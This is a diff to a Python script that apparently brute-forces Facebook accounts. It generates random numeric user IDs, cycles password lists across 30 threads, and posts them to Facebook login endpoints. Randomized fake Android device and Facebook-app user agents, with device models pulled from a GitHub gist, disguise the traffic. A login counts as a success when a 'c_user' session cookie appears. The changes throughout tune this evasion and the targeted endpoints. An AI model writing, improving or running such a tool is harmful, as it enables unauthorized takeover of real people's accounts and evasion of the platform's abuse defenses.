@@ -261,7 +261,19 @@ SM-A222M""".splitlines()
 
 
 
+model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
 
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+def randBuildvsskj():
+    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
 
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
@@ -481,7 +493,7 @@ def pak():
 		linex()
 		pcs = input(' [?] Select: ')
 		for nmbr in range(limit):
-			nmp = ''.join(random.choice(string.digits) for _ in range(7))
+			nmp = ''.join(random.choice(string.digits) for _ in range(8))
 			user.append(nmp)
 		with tred(max_workers=30) as TRT:	
 			clear()
@@ -813,8 +825,9 @@ def api3(ids,names,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
+                        realme = random.choice(['RMX3536','RMX1429','RMX0730','RMX8549','RMX1284','RMX2839','RMX4183','RMX5062','RMX5993','RMX2747','RMX1110','RMX9869','RM9556','RMX4530','RMX3851','RMX8112','RMX8158','RMX0451','RMX5269','RMX6966','RMX4203','RMX6631','RMX5054','RMX608','RMX5044','RMX9096','RMX6827','RMX3731','RMX4','RMX343','RMX333','RMX110','RMX94','RMX1623','RM','RMX645','RM','RMX6231','RMX','RMX004','RMX7','RMX57','RMX403','RMX067','RMX9','','RMX683','RMX31','RMX010','RMX268','RMX306','RMX249','RMX8421','RMX7061','RMX705','RMX84','RMX345','RMX6020','RMX772','RMX5746','RMX206','RMX2305','RMX3954','RMX1252','RMX4535','RMX4899','RMX7','RMX','RMX0044','RMX8674','RMX0362','RMX8118','RMX0127','RMX1188','RMX3162','RMX0557','RMX5975','RMX1877','RMX9905','RMX7540','RMX7294','RMX8117','RMX8947','RMX1133','RMX3768','RMX4133','RMX7028','RMX9691','RMX7991','RMX9089','RMX7490','RMX5442','RMX6934','RMX0014','RMX8048','RMX3394','RMX6933','RMX4050','RMX6375','RMX2386','RMX0946','RMX9584','RMX7210','RMX6675','RMX9077','RMX8566','RMX7008','RMX9090','RMX6825','RMX9884','RMX1863','RMX6930','RMX5002','RMX1454','RMX4036','RMX0725','RMX9931','RMX3795','RMX7619','RMX5760','RMX1705','RMX5696','RMX8452','RMX4482','RMX1825','RMX1614','RMX8551','RMX9762','RMX4837','RMX4602','RMX0389','RMX2494','RMX4232','RMX8005','RMX1415','RMX7160','RMX9446','RMX2253','RMX8245','RMX5001','RMX2160','RMX0607','RMX6071','RMX5995','RMX4961','RMX7943','RMX2663','RMX1454','RMX7433','RMX7324','RMX4580','RMX3968','RMX6798','RMX2610','RMX2262','RMX5491','RMX3237','RMX0136','RMX8321','RMX1397','RMX6156','RMX6950','RMX9110','RMX1055','RMX0298','RMX7632','RMX2796','RMX9770','RMX8742','RMX3973','RMX2748','RMX5163','RMX9064','RMX7074','RMX0303','RMX5674','RMX0548','RMX9143','RMX7414','RMX1026','RMX8051','RMX1673','RMX6220','RMX1550','RMX9012','RMX5239','RMX9178','RMX3030','RMX9967','RMX6878','RMX5905','RMX1393','RMX9966','RMX6581','RMX9608','RMX4404','RMX5579','RMX5990','RMX5675'])
                         #ua = '#Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density={density1},width={width1},height={height1}};FBLC/{FBLC1};FBCR/{FBCR1};FBMF/{devicename};FBBD/{devicename};FBPN/{FBPN};FBDV/{devicemodel1};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi]'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+realme+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/Realme;FBBD/Realme;FBPN/'+fbpn+';FBDV/'+realme+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -1567,7 +1580,7 @@ def trt4(ids,passlist):
                                 'Authorization':f'OAuth {accessToken}',
                                 'X-FB-Friendly-Name':'authenticate',
                                 'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
+                                'User-Agent':randBuildLSB(),
                                 'Accept-Encoding':'gzip, deflate',
                                 'Content-Type': 'application/x-www-form-urlencoded',
                                 'X-FB-HTTP-Engine': 'Liger'
@@ -1709,7 +1722,7 @@ def trt6(ids,passlist):
 			sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(ruz)
-			free_fb = session.get('https://p.facebook.com').text
+			free_fb = session.get('https://mbasic.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1722,21 +1735,19 @@ def trt6(ids,passlist):
 			"login":"Log In"}
 			header_freefb = {'authority':'free.facebook.com',
 			'method': 'GET',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            'referer': 'https://free.facebook.com/login.php?next=https%3A%2F%2Ffree.facebook.com%2Fgettingstarted%2F%3Feav%3DAfZK_OXO2-tCqThnPaaQirDidiOVilfarzsueC38GRerDEnApqlf3gVqKS2-MDaj4cQ%26paipv%3D0&refsrc=deprecated&_rdr',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"V2031"',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-fetch-dest': 'document',
-          'sec-fetch-mode': 'navigate',
-          'sec-fetch-site': 'same-origin',
-          'sec-fetch-user': '?1',
-          'upgrade-insecure-requests': '1',
-          'user-agent': 'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',}
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
 			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
